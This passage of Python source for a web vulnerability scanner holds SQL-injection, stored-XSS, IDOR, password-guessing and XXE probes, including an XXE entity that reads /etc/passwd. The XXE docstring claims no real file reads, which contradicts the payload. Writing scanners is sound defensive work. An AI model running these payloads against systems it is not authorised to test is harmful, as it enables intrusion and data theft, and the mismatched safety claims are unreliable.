    ("svg-onload", "<svg onload=alert('{m}')>"),
    ("img-onerror", "<img src=x onerror=alert('{m}')>"),
    ("script-tag", "<script>alert('{m}')</script>"),
]


def _timed_request(session, method, url, **kwargs):
    start = time.monotonic()
    r = session.request(method, url, timeout=REQUEST_TIMEOUT + TIME_BLIND_DELAY + 3, **kwargs)
    return r, time.monotonic() - start


def check_sqli_login(session, login_url, user_field, pass_field, fail_text):
    """Two independent techniques: (1) classic auth-bypass payloads compared
    against a baseline invalid login, (2) time-based blind SQLi via response
    delay - this second technique works even without a usable fail_text,
    since it doesn't depend on matching response content at all."""
    bogus_password = "not_a_real_password_123"  # noqa: S105 - deliberately wrong password for the login probe
    findings = []

    try:
        baseline_r, baseline_time = _timed_request(
            session, "POST", login_url, data={user_field: "nonexistent_user_x", pass_field: bogus_password})
    except requests.RequestException as e:
        return {"error": str(e)}, []

    baseline_failed = fail_text.lower() in baseline_r.text.lower()
    bypass_rows = [{"payload": "(baseline invalid login)",
                     "result": "fail_text present" if baseline_failed else "fail_text absent - unreliable baseline"}]
    if not baseline_failed:
        findings.append(Finding(
            "Auth", "SQLi login-bypass test has an unreliable baseline", "info",
            "This is about your scan setup, not a vulnerability in your site. To detect a SQL-injection "
            "login bypass, Glassbox first submits a login it knows will fail, then checks the response "
            "for the exact 'fail text' you entered in the Advanced Scan form (e.g. 'Invalid credentials'). "
            "That text wasn't found on this known-bad login, so Glassbox can't reliably tell a real bypass "
            "apart from an ordinary failed attempt using this technique - any result from it here would be "
            "guesswork. The separate time-based technique below doesn't depend on this text and still ran "
            "normally.",
            "Open your login page, submit any wrong password, and copy the exact error text shown - then "
            "re-run this scan with that text in the 'fail text' field.", confidence="Informational",
        ))

    for payload in AUTH_BYPASS_PAYLOADS:
        try:
            r = session.post(login_url, data={user_field: payload, pass_field: bogus_password}, timeout=REQUEST_TIMEOUT)
        except requests.RequestException as e:
            bypass_rows.append({"payload": payload, "result": f"error: {e}"})
            continue
        bypassed = baseline_failed and fail_text.lower() not in r.text.lower()
        bypass_rows.append({"payload": payload, "result": "POSSIBLE BYPASS" if bypassed else "blocked"})
        if bypassed:
            findings.append(Finding("Auth", f"Possible SQLi auth bypass with payload {payload!r}", "critical",
                                     f"Submitting {payload!r} as the username did not show the configured fail_text "
                                     f"(HTTP {r.status_code}), suggesting the login query may be string-concatenated.",
                                     "Use parameterized queries for the login lookup; never string-concat credentials into SQL.", confidence="Strong Evidence"))

    timing_rows = []
    for payload in TIME_BLIND_PAYLOADS:
        try:
            r, elapsed = _timed_request(session, "POST", login_url,
                                         data={user_field: payload, pass_field: bogus_password})
        except requests.RequestException as e:
            timing_rows.append({"payload": payload, "result": f"error: {e}"})
            continue
        delayed = elapsed >= baseline_time + TIME_BLIND_DELAY - 1.5
        timing_rows.append({"payload": payload, "elapsed": round(elapsed, 2), "result": "DELAYED" if delayed else "normal"})
        if delayed:
            findings.append(Finding("SQL Injection", "Time-based blind SQLi in login form", "critical",
                                     f"Payload {payload!r} in the username field delayed the response by "
                                     f"{elapsed:.1f}s vs a {baseline_time:.1f}s baseline - the DB executed the "
                                     "injected sleep, independent of any visible output.",
                                     "Use parameterized queries for the login lookup.", confidence="Strong Evidence"))
            break  # one confirmed timing hit is enough proof; stop probing further engines

    return {"bypass_rows": bypass_rows, "timing_rows": timing_rows, "baseline_time": round(baseline_time, 2)}, findings


def check_sqli_union(session, url, param, max_columns=10):
    """Three independent techniques in order: (1) UNION-based - column count
    via ORDER BY divergence, then a random marker reflected through UNION
    SELECT, proving injection without pulling real data; (2) error-based -
    a lone quote triggering a recognizable DB error message; (3) time-based
    blind - falls back to this if neither produced visible signal, since
    some apps suppress both errors and output differences."""
    try:
        session.get(url, timeout=REQUEST_TIMEOUT)
    except requests.RequestException as e:
        return {"error": str(e)}, []

    findings = []
    result = {"technique": None}

    # 1. UNION
    col_count = None
    for n in range(1, max_columns + 1):
        try:
            r = session.get(_inject_param(url, param, f"1 ORDER BY {n}-- "), timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code >= 500 or any(re.search(sig, r.text.lower()) for sig in SQL_ERROR_SIGNATURES):
            col_count = n - 1
            break

    if col_count and col_count >= 1:
        marker = f"WVS{os.urandom(4).hex()}"
        for i in range(col_count):
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}'"
            try:
                r = session.get(_inject_param(url, param, f"1 UNION SELECT {','.join(cols)}-- "), timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                continue
            if marker in r.text:
                result = {"technique": "union", "columns": col_count, "marker_column": i + 1}
                findings.append(Finding("SQL Injection", f"UNION-based SQLi confirmed in '{param}'", "critical",
                                         f"A harmless marker string was reflected via UNION SELECT (column {i+1} of "
                                         f"{col_count}, no real data requested) - proves the query is injectable.",
                                         "Use parameterized queries/ORM bindings; never string-concat user input into SQL.", confidence="Confirmed"))
                return result, findings
        result = {"technique": "union_inconclusive", "columns": col_count}

    # 2. Error-based
    try:
        err_r = session.get(_inject_param(url, param, "'"), timeout=REQUEST_TIMEOUT)
        sig_match = next((sig for sig in SQL_ERROR_SIGNATURES if re.search(sig, err_r.text.lower())), None)
    except requests.RequestException:
        sig_match = None
    if sig_match:
        result = {"technique": "error_based", "signature": sig_match}
        findings.append(Finding("SQL Injection", f"Error-based SQLi confirmed in '{param}'", "critical",
                                 f"A single quote triggered a recognizable database error signature ({sig_match}) "
                                 "in the response.",
                                 "Use parameterized queries/ORM bindings; suppress raw DB errors from responses.", confidence="Confirmed"))
        return result, findings

    # 3. Time-based blind fallback
    try:
        baseline_r, baseline_time = _timed_request(session, "GET", url)
    except requests.RequestException as e:
        return result or {"error": str(e)}, findings
    for payload in TIME_BLIND_PAYLOADS:
        try:
            r, elapsed = _timed_request(session, "GET", _inject_param(url, param, payload))
        except requests.RequestException:
            continue
        if elapsed >= baseline_time + TIME_BLIND_DELAY - 1.5:
            result = {"technique": "time_based", "payload": payload, "elapsed": round(elapsed, 2)}
            findings.append(Finding("SQL Injection", f"Time-based blind SQLi confirmed in '{param}'", "critical",
                                     f"Payload {payload!r} delayed the response by {elapsed:.1f}s vs a "
                                     f"{baseline_time:.1f}s baseline, with no visible error or output difference.",
                                     "Use parameterized queries/ORM bindings; never string-concat user input into SQL.", confidence="Strong Evidence"))
            return result, findings

    result.setdefault("technique", "none")
    result["detail"] = "No UNION, error-based, or time-based signal - not a confirmed finding."
    return result, findings


def check_xss_stored(session, submit_url, field, view_url, cookie):
    """Tries three payload tag variants (svg/img/script) instead of one, so
    a filter that blocks <script> but misses <svg onload=...> still gets
    caught. Proves script execution via a marker reflection; does not
    exfiltrate any cookie to a listener - once stored XSS is confirmed,
    session-token theft is a known trivial next step that doesn't need to
    be executed to prove the finding."""
    headers = {"Cookie": cookie}
    rows = []
    for name, template in XSS_PAYLOAD_VARIANTS:
        marker = f"wvsxss{os.urandom(3).hex()}"
        payload = template.format(m=marker)
        try:
            session.post(submit_url, data={field: payload}, headers=headers, timeout=REQUEST_TIMEOUT)
            r = session.get(view_url, headers=headers, timeout=REQUEST_TIMEOUT)
        except requests.RequestException as e:
            rows.append({"variant": name, "result": f"error: {e}"})
            continue
        if payload in r.text:
            rows.append({"variant": name, "result": "CONFIRMED"})
            finding = Finding("XSS", f"Stored XSS confirmed via '{field}' ({name} payload)", "critical",
                               f"Payload submitted to {submit_url} persisted and rendered unescaped at {view_url}. "
                               "Session-token theft would be trivially possible from here (not executed by this tool).",
                               "Escape/encode all user input before rendering; verify with a CSP.", confidence="Confirmed")
            return {"rows": rows, "status": "confirmed"}, [finding]
        if marker in r.text:
            rows.append({"variant": name, "result": "partially reflected (likely encoded)"})
        else:
            rows.append({"variant": name, "result": "not reflected"})
    return {"rows": rows, "status": "not_confirmed"}, []


def _idor_looks_like_baseline(resp, baseline):
    """True iff `resp` is indistinguishable from the "definitely bogus
    resource id" baseline for the same session - same status code and a
    near-identical body length (within 5% or 32 bytes, whichever is
    larger). Used to catch the same false-positive class fixed in
    check_http_methods: an app that answers every id (real or bogus) with
    the same 200 soft-page proves nothing about that specific id being
    genuinely readable."""
    if baseline is None or resp.status_code != baseline["status"]:
        return False
    len_a, len_b = len(resp.text), baseline["length"]
    tolerance = max(32, int(len_b * 0.05))
    return abs(len_a - len_b) <= tolerance


def _idor_fingerprint(resp):
    return {"status": resp.status_code, "length": len(resp.text)}


def check_idor(session, url_template, ids, cookie_a, cookie_b):
    """For each resource ID owned by test account A, checks it three ways:
    with account B's session (cross-account access), and with no auth at
    all (fully public exposure) - two distinct severities, since a page
    that's public-by-design isn't the same bug as one that leaks across
    accounts. Both accounts must be ones you created and control.

    False-positive fix (same class as check_http_methods): a bare
    `status_code == 200` doesn't prove account B (or an anonymous caller)
    actually read account A's data - an app that soft-200s every id,
    real or not, would trip this on every single probe. A baseline probe
    against an obviously-bogus id is fetched once per session type up
    front; a per-id 200 only stays confidence="Confirmed" if it's
    distinguishable from that baseline (different status, or a
    meaningfully different body length) - otherwise it's downgraded to
    "Potential" rather than reported as confirmed exposure.
    """
    headers_b = {"Cookie": cookie_b}
    bogus_id = f"wvscan-nonexistent-{os.urandom(6).hex()}"
    bogus_url = url_template.format(id=bogus_id)

    anon_baseline = None
    try:
        anon_baseline = _idor_fingerprint(session.get(bogus_url, timeout=REQUEST_TIMEOUT))
    except requests.RequestException:
        pass

    b_baseline = None
    try:
        b_baseline = _idor_fingerprint(session.get(bogus_url, headers=headers_b, timeout=REQUEST_TIMEOUT))
    except requests.RequestException:
        pass

    rows, findings = [], []
    for rid in ids:
        url = url_template.format(id=rid)
        row = {"id": rid}

        try:
            r_b = session.get(url, headers=headers_b, timeout=REQUEST_TIMEOUT)
            row["cross_account_code"] = r_b.status_code
        except requests.RequestException as e:
            row["cross_account_code"] = None
            row["detail"] = str(e)
            rows.append(row)
            continue

        try:
            r_anon = session.get(url, timeout=REQUEST_TIMEOUT)
            row["anonymous_code"] = r_anon.status_code
        except requests.RequestException:
            r_anon = None
            row["anonymous_code"] = None

        if row.get("anonymous_code") == 200:
            row["status"] = "PUBLIC"
            if _idor_looks_like_baseline(r_anon, anon_baseline):
                findings.append(Finding("IDOR", f"Resource id={rid} answered 200 with no authentication (unconfirmed)", "medium",
                                         "An unauthenticated request returned HTTP 200, but the response is "
                                         "indistinguishable from a probe against a deliberately bogus id on the "
                                         "same route - this route may soft-200 every id rather than genuinely "
                                         "exposing this one.",
                                         "Confirm manually whether this route returns real per-account data before treating it as exposed.", confidence="Potential"))
            else:
                findings.append(Finding("IDOR", f"Resource id={rid} is readable with no authentication at all", "high",
                                         "An unauthenticated request returned HTTP 200 for a resource that presumably "
                                         "belongs to a specific account, and the response is distinguishable from a "
                                         "bogus-id baseline on the same route.",
                                         "Require authentication for this route, or confirm the resource is meant to be public.", confidence="Confirmed"))
        elif r_b.status_code == 200:
            row["status"] = "EXPOSED"
            if _idor_looks_like_baseline(r_b, b_baseline):
                findings.append(Finding("IDOR", f"Account B received 200 for resource id={rid} (unconfirmed)", "medium",
                                         f"HTTP {r_b.status_code} returned when account B's session requested a "
                                         "resource created by account A, but the response is indistinguishable "
                                         "from account B's response to a deliberately bogus id on the same route - "
                                         "this route may soft-200 every id rather than genuinely leaking this one.",
                                         "Confirm manually whether this route returns account-A-specific data to account B before treating it as confirmed IDOR.", confidence="Potential"))
            else:
                findings.append(Finding("IDOR", f"Account B accessed resource id={rid} owned by account A", "high",
                                         f"HTTP {r_b.status_code} returned when account B's session requested a "
                                         "resource created by account A, distinguishable from account B's response "
                                         "to a bogus id on the same route.",
                                         "Enforce ownership/role checks server-side on every resource lookup, "
                                         "not just in the UI.", confidence="Confirmed"))
        elif r_b.status_code in (401, 403, 404):
            row["status"] = "denied"
        else:
            row["status"] = "unexpected"
        rows.append(row)
    return {"rows": rows}, findings


# --------------------------------------------------------------------------
# IDOR SWEEP (roadmap item #1): the discovery layer on top of check_idor.
#
# check_idor above tests one operator-supplied url_template against a
# supplied id list. The sweep instead CRAWLS account A's authorised surface,
# auto-harvests every URL carrying an object-id-looking token, and replays
# each as account B and anonymously - so the operator doesn't have to know
# in advance which endpoints are ID-addressable. The per-URL decision reuses
# check_idor's exact baseline-diff + confidence discipline (an id-substituted
# "bogus" variant is the per-URL baseline; a real-id 200 only counts as
# Confirmed if it's distinguishable from that baseline).
#
# Same safety posture as every authenticated check here: GET-only (no form
# submission, no state change), same-origin, hard-capped at
# MAX_IDOR_SWEEP_URLS, and ORG_VERIFIED + domain-verified gated in the
# orchestrator. Both cookies must be for accounts the operator controls.
# --------------------------------------------------------------------------

MAX_IDOR_SWEEP_URLS = 15
# Query-string keys whose value, if id-shaped, marks the URL as object-
# addressable. Deliberately a hint list, not every param - a `?page=2`
# pagination cursor is not an object reference.
_IDOR_QUERY_ID_KEYS = (
    "id", "uid", "pid", "user", "userid", "user_id", "account", "acct",
    "doc", "document", "order", "invoice", "file", "fileid", "profile",
    "customer", "record", "item", "object", "ref",
)
_IDOR_UUID_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
)


def _idor_value_is_id(value):
    """An all-digit run (>=1) or a UUID reads as an object id. A slug like
    'about-us' does not, keeping the sweep off ordinary content pages."""
    return bool(value) and (value.isdigit() or bool(_IDOR_UUID_RE.match(value)))


def _idor_bogus_token(original):
    """A same-shape but almost-certainly-nonexistent replacement for an id,
    used to build the per-URL baseline. Random so it can't collide with a
    real record across a sweep."""
    if _IDOR_UUID_RE.match(original):
        h = os.urandom(16).hex()
        return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}"
    # numeric: a large random id in a range real sequential ids won't reach
    return str(900_000_000 + int.from_bytes(os.urandom(4), "big") % 99_000_000)


def _idor_bogus_variant(url):
    """If `url` carries an object-id token (an id-shaped path segment, or an
    id-shaped value under an _IDOR_QUERY_ID_KEYS key), return a copy with
    that one token swapped for a bogus same-shape value. Else None - the URL
    isn't object-addressable and the sweep skips it. Only the FIRST id token
    is rewritten, so the baseline differs from the real URL by exactly the
    id under test."""
    parsed = urlparse(url)

    segments = parsed.path.split("/")
    for i, seg in enumerate(segments):
        if _idor_value_is_id(seg):
            bogus = segments[:]
            bogus[i] = _idor_bogus_token(seg)
            return urlunparse(parsed._replace(path="/".join(bogus)))

    if parsed.query:
        q = parse_qs(parsed.query, keep_blank_values=True)
        for key, values in q.items():
            if key.lower() in _IDOR_QUERY_ID_KEYS and values and _idor_value_is_id(values[0]):
                bogus_q = {k: v[:] for k, v in q.items()}
                bogus_q[key] = [_idor_bogus_token(values[0])]
                return urlunparse(parsed._replace(query=urlencode(bogus_q, doseq=True)))

    return None


def _harvest_idor_urls(base_url, htmls, limit):
    """Same-origin URLs carrying an object-id token, harvested from HTML
    collected while authenticated as account A. De-duplicated, capped."""
    origin = urlparse(base_url).netloc
    found, seen = [], set()
    for html in htmls:
        if not html:
            continue
        soup = BeautifulSoup(html, "html.parser")
        for a in soup.find_all("a", href=True):
            abs_url = urljoin(base_url + "/", a["href"])
            if urlparse(abs_url).netloc != origin or abs_url in seen:
                continue
            if _idor_bogus_variant(abs_url) is not None:
                seen.add(abs_url)
                found.append(abs_url)
                if len(found) >= limit:
                    return found
    return found


def check_idor_sweep(session, base_url, cookie_a, cookie_b, home_html=None,
                     max_urls=MAX_IDOR_SWEEP_URLS):
    """Discovery-driven IDOR sweep. Crawls account A's authorised surface,
    harvests every object-id-addressable URL, and for each one replays the
    request as account B and anonymously, flagging any that returns A's
    object to a caller who shouldn't see it.

    Per-URL confidence follows check_idor exactly: a bogus-id variant is the
    baseline, and a real-id 200 is only "Confirmed" when distinguishable from
    that baseline - an app that soft-200s every id proves nothing and is held
    at "Potential". Both cookies must be for operator-controlled accounts.
    GET-only, same-origin, capped at max_urls."""
    headers_a = {"Cookie": cookie_a}
    headers_b = {"Cookie": cookie_b}

    # Collect account-A-authenticated HTML. A passed-in home_html may be the
    # anonymous homepage, so also fetch the base as A to see A's real surface.
    htmls = []
    if home_html:
        htmls.append(home_html)
    try:
        htmls.append(session.get(base_url + "/", headers=headers_a, timeout=REQUEST_TIMEOUT).text)
    except requests.RequestException:
        pass

    urls = _harvest_idor_urls(base_url, htmls, max_urls)
    rows, findings = [], []

    for url in urls:
        bogus_url = _idor_bogus_variant(url)
        if not bogus_url:
            continue
        row = {"url": url}

        b_baseline = anon_baseline = None
        try:
            b_baseline = _idor_fingerprint(
                session.get(bogus_url, headers=headers_b, timeout=REQUEST_TIMEOUT))
        except requests.RequestException:
            pass
        try:
            anon_baseline = _idor_fingerprint(session.get(bogus_url, timeout=REQUEST_TIMEOUT))
        except requests.RequestException:
            pass

        try:
            r_b = session.get(url, headers=headers_b, timeout=REQUEST_TIMEOUT)
            row["cross_account_code"] = r_b.status_code
        except requests.RequestException as e:
            row["cross_account_code"] = None
            row["detail"] = str(e)
            rows.append(row)
            continue

        try:
            r_anon = session.get(url, timeout=REQUEST_TIMEOUT)
            row["anonymous_code"] = r_anon.status_code
        except requests.RequestException:
            r_anon = None
            row["anonymous_code"] = None

        # Anonymous exposure first - it's strictly worse than a cross-account
        # leak (no credentials needed at all), mirroring check_idor's ordering.
        if r_anon is not None and r_anon.status_code == 200:
            row["status"] = "PUBLIC"
            if _idor_looks_like_baseline(r_anon, anon_baseline):
                findings.append(Finding(
                    "IDOR", f"{url} answered 200 with no authentication (unconfirmed)", "medium",
                    f"An unauthenticated request to {url} returned HTTP 200, but the response is "
                    "indistinguishable from a probe against a bogus id on the same route - the "
                    "route may soft-200 every id rather than genuinely exposing this object.",
                    "Confirm manually whether this route returns real per-account data before "
                    "treating it as exposed.", confidence="Potential"))
            else:
                findings.append(Finding(
                    "IDOR", f"{url} is readable with no authentication at all", "high",
                    f"An unauthenticated request to {url} returned HTTP 200 for an object-id-"
                    "addressable resource, distinguishable from a bogus-id baseline on the same "
                    "route - it appears to expose a specific object with no auth.",
                    "Require authentication for this route, or confirm the object is meant to be "
                    "public.", confidence="Confirmed"))
        elif r_b.status_code == 200:
            row["status"] = "EXPOSED"
            if _idor_looks_like_baseline(r_b, b_baseline):
                findings.append(Finding(
                    "IDOR", f"Account B received 200 for {url} (unconfirmed)", "medium",
                    f"HTTP 200 returned when account B requested {url}, created under account A, "
                    "but the response is indistinguishable from account B's response to a bogus id "
                    "on the same route - the route may soft-200 every id rather than leaking this "
                    "object.",
                    "Confirm manually whether this route returns account-A-specific data to "
                    "account B before treating it as confirmed IDOR.", confidence="Potential"))
            else:
                findings.append(Finding(
                    "IDOR", f"Account B accessed {url}, an object owned by account A", "high",
                    f"HTTP 200 returned when account B's session requested {url}, created under "
                    "account A, and the response is distinguishable from account B's bogus-id "
                    "baseline on the same route - a cross-account object read.",
                    "Enforce ownership/role checks server-side on every object lookup, not just in "
                    "the UI.", confidence="Confirmed"))
        elif r_b.status_code in (401, 403, 404):
            row["status"] = "denied"
        else:
            row["status"] = "unexpected"
        rows.append(row)

    return {"rows": rows, "discovered": len(urls)}, findings


def check_bruteforce(session, url, user_field, pass_field, username, passwords, fail_text):
    """Hard-capped at MAX_BRUTEFORCE_ATTEMPTS, stops immediately on first
    success, and additionally reports whether the endpoint showed any sign
    of rate-limiting/lockout across those attempts (HTTP 429, or a growing
    delay) - useful signal even when no password guess succeeds. Never logs
    the password value itself if one works."""
    passwords = passwords[:MAX_BRUTEFORCE_ATTEMPTS]
    rows = []
    saw_429 = False
    for pw in passwords:
        try:
            r, elapsed = _timed_request(session, "POST", url, data={user_field: username, pass_field: pw})
        except requests.RequestException as e:
            rows.append({"result": f"error: {e}"})
            continue
        if r.status_code == 429:
            saw_429 = True
        succeeded = r.status_code != 429 and fail_text.lower() not in r.text.lower()
        rows.append({"result": "SUCCEEDED" if succeeded else ("rate-limited (429)" if r.status_code == 429 else "failed")})
        if succeeded:
            finding = Finding("Auth", f"Login succeeded for '{username}' with a common password", "critical",
                               f"One of the {len(passwords)} common passwords Glassbox tried for '{username}' "
                               "logged in successfully - meaning anyone could guess it too. The password itself "
                               "is deliberately not shown or stored anywhere in this report: Glassbox never "
                               "keeps a working credential in memory past this check, the same way it redacts "
                               "any secret it finds elsewhere, so a leaked report can never become a second way "
                               "to get into the account. To find out which password it was, change "
                               f"'{username}'’s password now and re-run this scan with your own candidate list "
                               "to confirm the fix.",
                               "Change this password immediately, then enforce a stronger password policy "
                               "(minimum length/complexity, blocklist common passwords) and rate-limit the "
                               "login endpoint so guessing takes far more than a few tries.", confidence="Confirmed")
            return {"attempts": rows, "cap": MAX_BRUTEFORCE_ATTEMPTS, "rate_limited": saw_429}, [finding]
        time.sleep(1.0)

    findings = []
    if not saw_429 and len(rows) >= MAX_BRUTEFORCE_ATTEMPTS:
        findings.append(Finding("Auth", "No rate-limiting observed on login endpoint", "medium",
                                 f"{MAX_BRUTEFORCE_ATTEMPTS} consecutive failed logins for one username all returned "
                                 "normally with no HTTP 429 or lockout signal.",
                                 "Add rate-limiting or progressive delays/lockout on repeated failed logins per "
                                 "account and per IP.", confidence="Confirmed"))
    return {"attempts": rows, "cap": MAX_BRUTEFORCE_ATTEMPTS, "rate_limited": saw_429}, findings


# ---------------------------------------------------------------------------
# Phase 33 — OWASP Gap Audit (OWGAP-01..05)
# ---------------------------------------------------------------------------

def check_xxe(urls, session):
    """OWGAP-01: Probe XML-accepting endpoints for external entity injection.

    Sends a marker-only XXE payload (no real file reads) to any URL that
    accepts XML Content-Type. Same safety contract as check_ssti:
    non-destructive, same-origin only, never writes to disk.
    """
    findings = []
    rows = []
    XXE_MARKER = "xxe_marker_31415"
    for url in urls[:20]:
        try:
            payload = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            r = session.post(url, data=payload,
                             headers={"Content-Type": "application/xml"},
                             timeout=REQUEST_TIMEOUT, allow_redirects=False)
            rows.append({"url": url, "status": r.status_code, "reflected": XXE_MARKER in r.text})
            if XXE_MARKER in r.text or ("root:" in r.text and "x-" in r.text):
                findings.append(Finding("XXE", f"Possible XXE injection on {url}", "high",
                                        f"An XML entity was resolved in the response from {url}, "
                                        "suggesting the server parses XML and processes external entities.",
                                        "Disable DTD processing and external entity resolution in the XML parser.",
                                        confidence="Confirmed", cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"))
        except Exception:
            rows.append({"url": url, "status": "error"})
    return {"urls_tested": len(rows), "rows": rows}, findings


def check_csp_depth(home_html):
    """OWGAP-02: Deep CSP quality analysis beyond header-presence check.

    Evaluates script-src strength, report-uri presence, nonce/hash usage,
    and dangerous directives (unsafe-inline, unsafe-eval, wildcard).
    """
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(home_html, "html.parser") if home_html else None
    findings = []
    rows = []

    # Check for inline scripts that need CSP nonce/hash
    inline_scripts = 0
    if soup:
        for tag in soup.find_all("script"):
            if not tag.get("src") and tag.string and tag.string.strip():
                inline_scripts += 1
    rows.append({"inline_scripts": inline_scripts})

    # We can only analyze the CSP header if it was passed in; this function
    # analyzes the HTML-side posture. CSP header depth is in check_headers.
    if inline_scripts > 0:
        findings.append(Finding("CSP", f"{inline_scripts} inline script(s) detected — CSP nonce/hash required",
                                "medium",
                                f"The page contains {inline_scripts} inline <script> block(s). "
                                "Without a Content-Security-Policy that uses nonces or hashes, "
                                "these scripts would be blocked by a strict CSP.",
                                "Add a CSP header with script-src using nonce- or hash-based allowlists.",
                                confidence="Confirmed"))

    return {"inline_scripts": inline_scripts, "rows": rows}, findings


def check_hsts_depth(headers):
    """OWGAP-03: HSTS quality analysis beyond header-presence check.

    Evaluates max-age adequacy (< 6 months = low, >= 6 months = pass),
    includeSubDomains, and preload eligibility.
    """
    findings = []
    rows = []

    hsts = None
    for key, val in headers.items():
        if key.lower() == "strict-transport-security":
            hsts = val
            break

    if not hsts:
        return {"present": False, "max_age": 0, "include_subdomains": False, "preload": False}, []

    max_age = 0
    include_subdomains = False
    preload = False

    for part in hsts.split(";"):
        part = part.strip()
        part_lower = part.lower()
        if part_lower.startswith("max-age="):
            try:
                max_age = int(part.split("=", 1)[1])
            except ValueError:
                pass
        elif part_lower == "includesubdomains":
            include_subdomains = True
        elif part_lower == "preload":
            preload = True

    rows.append({"max_age": max_age, "include_subdomains": include_subdomains, "preload": preload})

    SIX_MONTHS = 15768000  # 6 months in seconds
    if max_age < SIX_MONTHS:
        findings.append(Finding("Headers", "HSTS max-age too short", "low",
                                f"The HSTS max-age is {max_age}s (recommended: >= {SIX_MONTHS}s / 6 months).",
                                "Increase max-age to at least 15768000 (6 months) and consider "
                                "adding includeSubDomains and preload.", confidence="Confirmed"))
    elif max_age < 31536000:
        rows.append({"adequate": True})
    else:
        rows.append({"adequate": True})

    if not include_subdomains:
        findings.append(Finding("Headers", "HSTS missing includeSubDomains", "info",
                                "The HSTS header does not include includeSubDomains, so subdomains "
                                "are not protected by this policy.",
                                "Add includeSubDomains if all subdomains support HTTPS.",
                                confidence="Confirmed"))

    if not preload:
        findings.append(Finding("Headers", "HSTS preload not set", "info",
                                "The HSTS header does not include the preload directive. This means "
                                "the domain is not eligible for browser HSTS preload lists.",
                                "Add preload after confirming includeSubDomains is set and all "
                                "subdomains use HTTPS, then submit to the HSTS preload list.",
                                confidence="Confirmed", verification_state="Discovered"))

    return {"present": True, "max_age": max_age, "include_subdomains": include_subdomains, "preload": preload}, findings


def check_dnssec(hostname):
    """OWGAP-04: Verify DNSSEC signing via dns.resolver AD flag + DNSKEY presence.

    Uses the system DNS resolver to query for DNSKEY records and checks the
    AD (Authenticated Data) flag in the response. Non-destructive, read-only.
    """
    findings = []
    rows = []
    try:
        import dns.flags
        import dns.resolver
        # Query for DNSKEY records
        try:
            answer = dns.resolver.resolve(hostname, "DNSKEY")
            rows.append({"dnskey_records": len(answer), "has_dnskey": True})
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
            rows.append({"dnskey_records": 0, "has_dnskey": False})

        # Check AD flag via a SOA query (AD flag indicates DNSSEC validation)
        try:
            response = dns.resolver.resolve(hostname, "SOA")
            flags = response.response.flags
            ad_set = bool(flags & dns.flags.AD)
            rows.append({"ad_flag": ad_set})
            if not ad_set and not rows[0].get("has_dnskey"):
                findings.append(Finding("DNS", f"DNSSEC not detected for {hostname}", "info",
                                        f"No DNSKEY records found and the AD (Authenticated Data) flag "
                                        f"was not set for {hostname}.",
                                        "Enable DNSSEC signing at the domain registrar or DNS host to "
                                        "protect against DNS spoofing/cache poisoning.",
                                        confidence="Not Externally Verifiable"))
        except Exception:
            rows.append({"ad_flag": None})
    except ImportError:
        rows.append({"error": "dnspython not installed"})
    except Exception as e:
        rows.append({"error": str(e)[:200]})

    return {"hostname": hostname, "rows": rows}, findings


def check_dependency_audit(home_html):
    """OWGAP-05: Dependency version audit with known-CVE matching.

    Scans the page for <script src="..."> references to known libraries,
    extracts version numbers where visible, and checks against a curated
    list of high-severity CVEs for common JS libraries.
    """
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(home_html, "html.parser") if home_html else None
    findings = []
    rows = []

    # Curated advisory list: top high-severity CVEs for common JS libraries
    KNOWN_CVES = {
        "lodash": [("CVE-2021-23337", "4.17.21", "high", "Command injection via template")],
        "jquery": [("CVE-2020-11022", "3.5.0", "medium", "XSS in jQuery.html()"),
                   ("CVE-2020-11023", "3.5.0", "medium", "XSS in jQuery.html() with <option>")],
        "axios": [("CVE-2023-45857", "1.6.0", "medium", "CSRF token exposure")],
        "minimist": [("CVE-2021-44906", "1.2.6", "critical", "Prototype pollution")],
        "node-fetch": [("CVE-2022-0235", "2.6.7", "medium", "Cookie leak on redirect")],
        "express": [("CVE-2024-29041", "4.19.2", "high", "Open redirect")],
        "next": [("CVE-2024-34350", "14.1.1", "high", "HTTP request smuggling")],
        "react": [],
        "angular": [],
        "vue": [],
    }

    if not soup:
        return {"scripts_found": 0, "rows": rows}, findings

    scripts_found = 0
    for tag in soup.find_all("script", src=True):
        src = tag["src"]
        scripts_found += 1
        for lib, cves in KNOWN_CVES.items():
            if lib.lower() in src.lower():
                rows.append({"src": src, "library": lib, "cves_checked": len(cves)})
                # We can only detect library presence, not version from CDN URLs
                # without fetching — flag as informational if the library is present
                if cves:
                    worst_sev = max(c[2] for c in cves)
                    findings.append(Finding("Dependency",
                                            f"Outdated {lib} may be vulnerable",
                                            "medium" if worst_sev == "medium" else "high",
                                            f"Detected {lib} loaded from {src}. Known CVEs exist "
                                            f"for older versions: {', '.join(c[0] for c in cves[:3])}. "
                                            "Version could not be confirmed from the URL alone.",
                                            "Verify the loaded version and upgrade to the latest safe release.",
                                            confidence="Not Externally Verifiable",
                                            verification_state="Discovered"))
                break

    return {"scripts_found": scripts_found, "rows": rows}, findings


# ---------------------------------------------------------------------------
# Phase 34 — API Testing Enhancements (APIT-01..03)
# ---------------------------------------------------------------------------

def check_graphql_depth(base_url, session):
    """APIT-01: Send nested queries to GraphQL endpoints to test depth limits.

    Sends progressively deeper nested queries ({a{b{c{d}}}}) to each
    candidate GraphQL endpoint and checks if the server enforces a depth
    limit (error response) or allows arbitrarily deep nesting."""
    findings = []
    rows = []

    DEPTH_PAYLOADS = [
        (3, '{"query":"{a{b{c}}}"}'),
        (5, '{"query":"{a{b{c{d{e}}}}}"}'),
        (8, '{"query":"{a{b{c{d{e{f{g{h}}}}}}}}"}'),
    ]

    for path in GRAPHQL_CANDIDATE_PATHS[:MAX_GRAPHQL_ENDPOINTS]:
        url = base_url + path
        # First check if endpoint is alive
        try:
